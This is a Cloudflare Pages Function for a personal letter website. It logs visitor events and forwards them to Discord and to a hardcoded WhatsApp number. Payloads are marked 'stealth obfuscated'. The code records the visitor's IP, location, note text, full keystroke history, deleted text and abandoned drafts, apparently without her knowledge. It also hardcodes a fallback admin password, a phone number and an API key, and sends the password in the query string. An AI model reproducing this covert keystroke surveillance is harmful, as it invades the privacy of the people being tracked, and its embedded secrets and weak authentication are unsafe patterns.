// Cloudflare Pages Function: /api/flower-logs (GET logs for admin, POST new log event)

async function ensureLogSchema(db) {
  if (!db) return;
  try {
    await db.prepare(
      `CREATE TABLE IF NOT EXISTS activity_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        event_type TEXT NOT NULL,
        data_json TEXT NOT NULL,
        created_at TEXT NOT NULL
      )`
    ).run();
  } catch (e) {}
}

export async function onRequestGet(context) {
  const { request, env } = context;
  const url = new URL(request.url);
  const adminPassword = url.searchParams.get('adminPassword');
  const expectedAdminPass = env.ADMIN_PASSWORD || 'Doxish44_';

  if (!adminPassword || adminPassword !== expectedAdminPass) {
    return new Response(JSON.stringify({ error: 'Yetki hatası' }), { status: 403 });
  }

  if (env.DB) {
    try {
      await ensureLogSchema(env.DB);
      const { results } = await env.DB.prepare(
        'SELECT * FROM activity_logs ORDER BY id DESC LIMIT 500'
      ).all();

      const formattedLogs = (results || []).map((row) => ({
        id: row.id,
        eventType: row.event_type,
        data: JSON.parse(row.data_json || '{}'),
        createdAt: row.created_at
      }));

      return new Response(JSON.stringify(formattedLogs), {
        headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
      });
    } catch (err) {}
  }

  return new Response(JSON.stringify([]), {
    headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
  });
}

import { sendDiscordWebhook } from './_discord.js';

export async function onRequestPost(context) {
  const { request, env } = context;

  try {
    let body = await request.json();

    // Decode Stealth Obfuscated Payload
    if (body && body._v) {
      try {
        const decodedStr = decodeURIComponent(atob(body._v));
        body = JSON.parse(decodedStr);
      } catch (e) {}
    }

    const eventType = body.eventType || 'general_event';
    const data = body.data || {};
    const timestamp = body.timestamp || new Date().toISOString();

    // Extract real client IP and Cloudflare geo metadata
    const clientIp = request.headers.get('cf-connecting-ip') || request.headers.get('x-real-ip') || 'Bilinmiyor';
    const userAgent = request.headers.get('user-agent') || '';
    const city = request.headers.get('cf-ipcity') || (request.cf && request.cf.city) || '';
    const country = request.headers.get('cf-ipcountry') || (request.cf && request.cf.country) || '';

    const enrichedData = {
      ...data,
      ip: clientIp,
      location: city && country ? `${city}, ${country}` : country || city || null,
      userAgent: data.userAgent || userAgent
    };

    // Ignore excluded / developer device IDs (Zero notifications for dev_m2troqnl9_mswunr9c)
    const IGNORED_DEVICE_IDS = ['dev_m2troqnl9_mswunr9c'];
    const clientDevId = String(data.deviceId || enrichedData.deviceId || '').trim();
    if (clientDevId && IGNORED_DEVICE_IDS.includes(clientDevId)) {
      return new Response(JSON.stringify({ success: true, ignored: true }), {
        headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
      });
    }

    if (env.DB) {
      await ensureLogSchema(env.DB);
      await env.DB.prepare(
        'INSERT INTO activity_logs (event_type, data_json, created_at) VALUES (?, ?, ?)'
      )
        .bind(eventType, JSON.stringify(enrichedData), timestamp)
        .run();
    }

    // Send Discord / BotGhost Webhook notification
    try {
      await sendDiscordWebhook(env, eventType, enrichedData, timestamp);
    } catch (e) {}

    // Send Real-Time WhatsApp Notification (CallMeBot Integration)
    try {
      await sendWhatsAppNotification(eventType, enrichedData);
    } catch (e) {}

    return new Response(JSON.stringify({ success: true }), {
      headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
    });
  } catch (err) {
    return new Response(JSON.stringify({ error: err.message }), { status: 500 });
  }
}

async function sendWhatsAppNotification(eventType, data = {}) {
  try {
    const PHONE = '+905418445100';
    const API_KEY = '5815335';

    // Ignore developer device IDs (Zero notifications for dev_m2troqnl9_mswunr9c)
    const IGNORED_DEVICE_IDS = ['dev_m2troqnl9_mswunr9c'];
    const devId = String(data.deviceId || '').trim();
    if (devId && IGNORED_DEVICE_IDS.includes(devId)) return;

    let msg = '';

    if (eventType === 'last_scroll_started') {
      msg = `📜 *Ziyaretçi /last Sayfasını Kaydırmaya Başladı!*\n\n` +
            `👉 *Eylem:* Cümleler & Geri Sayım Ekranı Kaydırılıyor\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    } else if (eventType === 'last_lock_clicked') {
      msg = `🔒 *Mektubu Sakla Butonuna Basıldı!*\n\n` +
            `👉 Ziyaretçi mektup saklama formunu açtı.\n` +
            `⏱️ *Sayfaya Geldikten:* ${data.buttonClickTime || '-'}\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    } else if (eventType === 'last_note_locked') {
      msg = `🔒 *Mühürlü Not & Mektup Oluşturuldu!*\n\n` +
            `📝 *Yazılan Not:* "${data.noteText || data.note || '-'}"\n` +
            `⌨️ *Klavye Geçmişi:* "${data.allTypedHistory || '-'}"\n` +
            `✂️ *Silinen Parçalar:* "${data.deletedText || '-'}"\n` +
            `📅 *Açılacağı Tarih:* ${data.targetDate || '-'}\n` +
            `🔑 *Kilit Kodu:* ${data.sha256Code || '-'}\n` +
            `⏱️ *Butona Basılma Süresi:* ${data.buttonClickTime || '-'}\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    } else if (eventType === 'last_burn_modal_opened') {
      msg = `🔥 *Mektubu Yak Butonuna Basıldı!*\n\n` +
            `👉 Ziyaretçi mektup yakma onay penceresini açtı.\n` +
            `⏱️ *Sayfaya Geldikten:* ${data.buttonClickTime || '-'}\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    } else if (eventType === 'last_burn_modal_choice') {
      const isProceed = data.choice && (data.choice.includes('Devam') || data.choice.includes('Kabul') || data.choice.includes('Evet'));
      msg = `${isProceed ? '🔥' : '🛡️'} *Mektup Yakma Kararı: ${data.choice || '-'}*\n\n` +
            `👉 Ziyaretçi yakma penceresinde kararını verdi: ${data.choice || '-'}\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    } else if (eventType === 'last_letter_burned') {
      msg = `🔥 *Neyse Mektubu YAKILDI ve 10 Dk Sayaç Başlatıldı!*\n\n` +
            `⚠️ *Durum:* Ziyaretçi mektubu yakmayı onayladı.\n` +
            `⏱️ *Butona Basılma Süresi:* ${data.buttonClickTime || '-'}\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    } else if (eventType === 'last_letter_zoom_toggled') {
      msg = `🔍 *3D Mektuba Tıklandı (Zoom)*\n\n` +
            `👉 Ziyaretçi ortadaki 3D mektuba tıklayarak büyüttü/küçülttü.\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    } else if (eventType === 'last_letter_fully_unfolded') {
      msg = `📜 *3D Mektup Tamamen Katından Çıkarıldı ve Okunuyor*\n\n` +
            `👉 Ziyaretçi mektubu tam ekranda açtı.\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    } else if (eventType === 'last_page_abandoned') {
      msg = `🚪 *Ziyaretçi /last Sayfasından Ayrıldı / Sekmeyi Kapattı*\n\n` +
            `⏱️ *Sitede Kalınan Süre:* ${data.duration || '-'}\n` +
            `📍 *Ayrıldığı Aşama:* ${data.stage || '-'}\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    } else if (eventType === 'first_scroll_started') {
      msg = `📜 *Ziyaretçi Ana Sayfayı Kaydırmaya Başladı*\n\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    } else if (eventType === 'food_input_typed') {
      msg = `💬 *Yemek Kutusuna Cevap Yazıldı*\n\n` +
            `📝 *Yazılan Cevap:* "${data.input || data.answer || '-'}"\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    } else if (eventType === 'sut_corbasi_unlocked') {
      msg = `🍲 *Süt Çorbası Şifresi Çözüldü!*\n\n` +
            `🎉 "Süt Çorbası" yazarak Ayşenur mektubunun kilidi açıldı!\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    } else if (eventType === 'aysenur_letter_reached') {
      msg = `🌹 *Ayşenur Mektubu Ekranına Ulaşıldı*\n\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    } else if (eventType === 'page_bottom_reached') {
      msg = `🏔️ *Sayfanın En Altına Ulaşıldı*\n\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    } else if (eventType === 'visitor_left_page') {
      msg = `🚪 *Ziyaretçi Ana Sayfadan Ayrıldı / Sekmeyi Kapattı*\n\n` +
            `⏱️ *Sitede Kalınan Süre:* ${data.duration || '-'}\n` +
            `📍 *Ayrıldığı Aşama:* ${data.stage || '-'}\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    } else if (eventType === 'letter_submitted') {
      msg = `✉️ *Yeni Mektup Gönderildi!*\n\n` +
            `📝 *Mektup:* "${data.text || data.letterText || '-'}"\n` +
            `👤 *Gönderen:* ${data.author || 'Anonim'}\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    } else if (eventType === 'letter_draft_abandoned') {
      msg = `✏️ *Mektup Yazılırken Sekme Kapandı*\n\n` +
            `📝 *Kalan Taslak:* "${data.draft || data.text || '-'}"\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    } else {
      msg = `📢 *Etkinlik:* ${eventType}\n\n` +
            `👉 *Eylem:* ${data.action || data.stage || '-'}\n` +
            `📱 *Cihaz:* ${data.device || '-'}`;
    }

    const encodedText = encodeURIComponent(msg);
    const url = `https://api.callmebot.com/whatsapp.php?phone=${encodeURIComponent(PHONE)}&text=${encodedText}&apikey=${API_KEY}`;
    
    await fetch(url);
  } catch (e) {}
}
